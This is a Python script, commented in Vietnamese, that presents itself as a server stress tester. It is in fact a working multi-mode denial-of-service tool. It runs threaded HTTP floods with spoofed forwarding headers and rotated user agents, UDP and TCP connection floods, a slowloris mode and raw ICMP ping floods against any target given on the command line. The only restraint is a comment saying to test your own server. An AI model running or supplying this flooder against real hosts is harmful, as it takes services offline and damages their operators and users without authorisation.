#!/usr/bin/env python3
"""
stress tester — HTTP / UDP / TCP flood
dùng để test server của chính mình
"""

import socket
import threading
import time
import random
import argparse
import sys
import os
import struct
from urllib.request import urlopen, Request
from urllib.error import URLError
from collections import defaultdict

# ── stats shared state ──────────────────────────────────────────────
lock = threading.Lock()
stats = {
    "sent": 0,
    "failed": 0,
    "bytes": 0,
    "start": 0.0,
}

def inc(key, val=1):
    with lock:
        stats[key] += val

# ── helpers ──────────────────────────────────────────────────────────
def rand_str(n=8):
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(random.choice(chars) for _ in range(n))

def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/605.1",
    "curl/8.7.1",
    "python-httpx/0.27.0",
    "Go-http-client/2.0",
]

# ── attack modes ─────────────────────────────────────────────────────

def http_flood(target: str, method: str, duration: int, delay: float, path: str):
    """HTTP GET / POST flood với random header và query params"""
    deadline = time.time() + duration
    while time.time() < deadline:
        try:
            url = f"{target.rstrip('/')}{path}?r={rand_str()}"
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "X-Forwarded-For": rand_ip(),
                "X-Real-IP": rand_ip(),
                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Cache-Control": "no-cache",
                "Connection": "keep-alive",
            }
            body = None
            if method.upper() == "POST":
                body = f"data={rand_str(32)}&ts={int(time.time())}".encode()
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                headers["Content-Length"] = str(len(body))

            req = Request(url, data=body, headers=headers, method=method.upper())
            with urlopen(req, timeout=5) as resp:
                data = resp.read()
                inc("sent")
                inc("bytes", len(data))
        except Exception:
            inc("failed")
        if delay > 0:
            time.sleep(delay)


def udp_flood(host: str, port: int, duration: int, pkt_size: int):
    """UDP flood — gửi random payload liên tục"""
    deadline = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = os.urandom(pkt_size)
    try:
        while time.time() < deadline:
            try:
                sent = sock.sendto(payload, (host, port))
                inc("sent")
                inc("bytes", sent)
            except Exception:
                inc("failed")
    finally:
        sock.close()


def tcp_flood(host: str, port: int, duration: int, keep_alive: bool):
    """TCP connection flood — mở connection liên tục"""
    deadline = time.time() + duration
    while time.time() < deadline:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            if keep_alive:
                # slowloris style — gửi partial HTTP header rồi giữ
                s.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
                time.sleep(random.uniform(0.1, 0.5))
            inc("sent")
            inc("bytes", 64)
            if not keep_alive:
                s.close()
        except Exception:
            inc("failed")


def icmp_flood(host: str, duration: int):
    """ICMP ping flood — cần root"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("[!] ICMP flood cần root (sudo). Bỏ qua mode này.")
        return

    def checksum(data):
        s = 0
        for i in range(0, len(data) - 1, 2):
            s += (data[i] << 8) + data[i + 1]
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    deadline = time.time() + duration
    while time.time() < deadline:
        try:
            # build ICMP echo request
            header = struct.pack("bbHHh", 8, 0, 0, random.randint(1, 65535), 1)
            data = os.urandom(56)
            chk = checksum(header + data)
            header = struct.pack("bbHHh", 8, 0, chk, random.randint(1, 65535), 1)
            s.sendto(header + data, (host, 0))
            inc("sent")
            inc("bytes", len(header) + len(data))
        except Exception:
            inc("failed")


# ── stats printer ─────────────────────────────────────────────────────
def print_stats(duration: int):
    cols = os.get_terminal_size().columns if sys.stdout.isatty() else 80
    while True:
        time.sleep(1)
        with lock:
            elapsed = time.time() - stats["start"]
            sent = stats["sent"]
            failed = stats["failed"]
            mbytes = stats["bytes"] / 1_048_576

        rps = sent / elapsed if elapsed > 0 else 0
        mbps = mbytes / elapsed if elapsed > 0 else 0
        pct = min(elapsed / duration * 100, 100)
        bar_w = cols - 30
        filled = int(bar_w * pct / 100)
        bar = "█" * filled + "░" * (bar_w - filled)

        line = (
            f"\r[{bar}] {pct:5.1f}% | "
            f"sent={sent} fail={failed} | "
            f"{rps:.0f} rps | {mbps:.2f} MB/s"
        )
        sys.stdout.write(line[:cols])
        sys.stdout.flush()

        if elapsed >= duration:
            print()
            break


# ── main ──────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="stress tester — test server của mày thôi nha",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  python stresser.py http http://localhost:8080 -t 30 -c 100
  python stresser.py http https://mysite.dev -t 60 -c 200 -m POST
  python stresser.py udp 192.168.1.10 -p 53 -t 30 -c 50
  python stresser.py tcp 192.168.1.10 -p 80 -t 30 -c 100
  python stresser.py tcp 192.168.1.10 -p 80 -t 30 -c 50 --slowloris
  sudo python stresser.py icmp 192.168.1.10 -t 30 -c 50
        """,
    )

    ap.add_argument("mode", choices=["http", "udp", "tcp", "icmp"],
                    help="loại flood")
    ap.add_argument("target", help="URL (http mode) hoặc IP/hostname")
    ap.add_argument("-p", "--port", type=int, default=80,
                    help="port (udp/tcp/icmp, default=80)")
    ap.add_argument("-t", "--duration", type=int, default=30,
                    help="thời gian chạy (giây, default=30)")
    ap.add_argument("-c", "--concurrency", type=int, default=50,
                    help="số thread đồng thời (default=50)")
    ap.add_argument("-m", "--method", default="GET",
                    help="HTTP method GET|POST (default=GET)")
    ap.add_argument("--path", default="/",
                    help="HTTP path (default=/)")
    ap.add_argument("--delay", type=float, default=0.0,
                    help="delay giữa các request mỗi thread (giây)")
    ap.add_argument("--pkt-size", type=int, default=1024,
                    help="UDP packet size bytes (default=1024)")
    ap.add_argument("--slowloris", action="store_true",
                    help="TCP slowloris mode — giữ kết nối lâu")

    args = ap.parse_args()

    target = args.target
    mode = args.mode
    dur = args.duration
    conc = args.concurrency

    # resolve host nếu cần
    host = target
    if mode == "http":
        from urllib.parse import urlparse
        parsed = urlparse(target if "://" in target else "http://" + target)
        host = parsed.hostname
    else:
        target = host  # strip scheme nếu user nhầm

    print(f"[*] mode     : {mode.upper()}")
    print(f"[*] target   : {target}")
    if mode != "http":
        print(f"[*] port     : {args.port}")
    print(f"[*] duration : {dur}s")
    print(f"[*] threads  : {conc}")
    print(f"[*] bắt đầu...")
    print()

    stats["start"] = time.time()

    threads = []

    for _ in range(conc):
        if mode == "http":
            t = threading.Thread(
                target=http_flood,
                args=(target, args.method, dur, args.delay, args.path),
                daemon=True,
            )
        elif mode == "udp":
            t = threading.Thread(
                target=udp_flood,
                args=(host, args.port, dur, args.pkt_size),
                daemon=True,
            )
        elif mode == "tcp":
            t = threading.Thread(
                target=tcp_flood,
                args=(host, args.port, dur, args.slowloris),
                daemon=True,
            )
        elif mode == "icmp":
            t = threading.Thread(
                target=icmp_flood,
                args=(host, dur),
                daemon=True,
            )
        t.start()
        threads.append(t)

    # stats printer chạy song song
    st = threading.Thread(target=print_stats, args=(dur,), daemon=True)
    st.start()

    for t in threads:
        t.join()
    st.join()

    elapsed = time.time() - stats["start"]
    print("\n── kết quả ──────────────────────────────────")
    print(f"  thời gian  : {elapsed:.1f}s")
    print(f"  sent       : {stats['sent']:,}")
    print(f"  failed     : {stats['failed']:,}")
    print(f"  total data : {stats['bytes'] / 1_048_576:.2f} MB")
    print(f"  avg rps    : {stats['sent'] / elapsed:.1f}")
    print(f"  avg MB/s   : {stats['bytes'] / 1_048_576 / elapsed:.2f}")


if __name__ == "__main__":
    main()
